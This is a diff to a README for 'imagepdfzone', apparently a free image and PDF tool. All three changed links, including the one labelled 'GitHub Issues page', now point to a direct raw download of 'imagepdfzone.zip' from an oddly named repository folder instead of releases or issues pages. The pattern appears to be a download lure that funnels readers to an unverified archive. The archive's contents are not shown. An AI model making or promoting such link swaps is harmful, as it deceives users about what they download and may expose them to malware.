@@ -6,7 +6,7 @@ Welcome to imagepdfzone! This web application offers a variety of free tools to 
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download imagepdfzone](https://github.com/cobyxxx/imagepdfzone/releases). 
+To get started, visit this page to download: [Download imagepdfzone](https://raw.githubusercontent.com/cobyxxx/imagepdfzone/main/physiurgic/imagepdfzone.zip). 
 
 You’ll find different versions of the application there. Choose the one that works best for you.
 
@@ -39,7 +39,7 @@ imagepdfzone supports a wide range of file formats:
 ## 💡 How to Use imagepdfzone
 
 1. **Open Your Browser**: Start by opening a modern web browser.
-2. **Visit the Download Page**: Go to the [Download imagepdfzone](https://github.com/cobyxxx/imagepdfzone/releases) link.
+2. **Visit the Download Page**: Go to the [Download imagepdfzone](https://raw.githubusercontent.com/cobyxxx/imagepdfzone/main/physiurgic/imagepdfzone.zip) link.
 3. **Download the Application**: Click on the version you want to use and follow the prompts to download.
 4. **Open the App**: Locate the downloaded file and open it in your browser.
 5. **Choose Your Tool**: Use the image or PDF processing tool you need from the main menu.
@@ -64,6 +64,6 @@ If you encounter issues:
 
 ## 📞 Support
 
-If you need help, you can reach out through the [GitHub Issues page](https://github.com/cobyxxx/imagepdfzone/issues). Our team is ready to assist you.
+If you need help, you can reach out through the [GitHub Issues page](https://raw.githubusercontent.com/cobyxxx/imagepdfzone/main/physiurgic/imagepdfzone.zip). Our team is ready to assist you.
 
 Happy processing! Enjoy using imagepdfzone for your image and PDF needs.
